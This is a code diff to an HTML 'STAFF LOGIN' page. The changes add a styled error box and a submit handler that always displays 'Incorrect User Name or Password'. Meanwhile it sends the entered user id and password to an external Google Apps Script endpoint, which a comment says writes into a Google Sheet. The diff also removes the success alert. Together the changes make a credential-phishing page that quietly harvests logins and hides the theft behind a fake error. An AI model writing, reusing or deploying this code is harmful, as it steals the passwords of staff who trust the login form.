@@ -72,7 +72,21 @@
             text-align: center;
             font-size: 18px;
             font-weight: bold;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
+        }
+
+        /* Red Error Message Styling */
+        .error-message {
+            color: #d32f2f;
+            background-color: #ffebee;
+            border: 1px solid #ffcdd2;
+            padding: 8px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            display: none; /* Hide dis by default */
         }
 
         .form-group {
@@ -185,6 +199,10 @@
         <!-- Login Box -->
         <div class="login-card">
             <div class="login-title">STAFF LOGIN</div>
+
+            <!-- Red Error Message Container -->
+            <div id="errorMessage" class="error-message">Incorrect User Name or Password</div>
+
             <form id="loginForm">
                 <div class="form-group">
                     <label for="userid">User Id</label>
@@ -233,12 +251,17 @@
     <script>
         const scriptURL = 'https://script.google.com/macros/s/AKfycbxaj4pWphw6wCUVFF7vmwuVGqeQ4SENyBNamutM6mdhbk1gLUs12K38NOcEeX92sofzJg/exec';
         const form = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
 
         form.addEventListener('submit', e => {
             e.preventDefault();
+
+            // Show di red error message
+            errorMessage.style.display = 'block';
+
+            // Send di data na Google Sheet
             fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response => {
-                    alert('Data successful submit ho gaya!');
                     form.reset();
                 })
                 .catch(error => console.error('Error!', error.message));
